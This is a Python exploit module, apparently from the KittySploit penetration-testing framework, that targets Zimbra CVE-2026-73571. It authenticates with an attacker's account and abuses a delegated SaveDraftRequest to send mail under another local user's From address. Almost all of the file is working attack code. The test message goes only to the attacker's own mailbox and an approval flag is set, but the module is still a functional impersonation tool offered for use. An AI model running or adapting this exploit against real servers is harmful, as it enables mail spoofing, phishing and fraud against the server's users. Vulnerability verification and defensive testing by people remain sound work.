#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-73571 — send mail as another local user via SaveDraft."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.zimbra import Zimbra


class Module(Auxiliary, Http_client, Zimbra):
    __info__ = {
        "name": "Zimbra CVE-2026-73571 mail impersonation",
        "description": (
            "Authenticated SaveDraftRequest with isDelegatedReq sends mail "
            "with another local address in From (fixed in ZCS 10.1.17)."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-73571"],
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-73571"],
        "tags": ["zimbra", "mail", "impersonation", "cve-2026-73571"],
        "agent": {
            "approval_required": True,
            "produces": ["risk_signals"],
            "chain": {"suggested_followups": ["scanner/http/zimbra_cve_2026_73571_detect"]},
        },
    }

    username = OptString("", "Attacker Zimbra account", required=True)
    password = OptString("", "Password", required=True)
    from_addr = OptString("", "Local From address to impersonate", required=True)

    _SUBJECT = "KittySploit CVE-2026-73571 verification"
    _BODY = "Delegated SaveDraft impersonation test from KittySploit."

    def run(self):
        user = str(self.username or "").strip()
        password = str(self.password or "")
        from_addr = str(self.from_addr or "").strip()
        to_addr = user
        token, raw = self.zimbra_auth(user, password)
        if not token:
            print_error("Zimbra auth failed")
            print_status(raw[:300])
            return False
        ok = self.zimbra_save_draft_send(
            token,
            from_addr=from_addr,
            to_addr=to_addr,
            subject=self._SUBJECT,
            body_text=self._BODY,
        )
        if not ok:
            print_error("SaveDraft delegated send rejected (patched?)")
            return False
        print_success(f"Delegated send submitted as {from_addr} -> {to_addr}")
        self.set_info(severity="high", cve="CVE-2026-73571", from_addr=from_addr, to_addr=to_addr)
        return True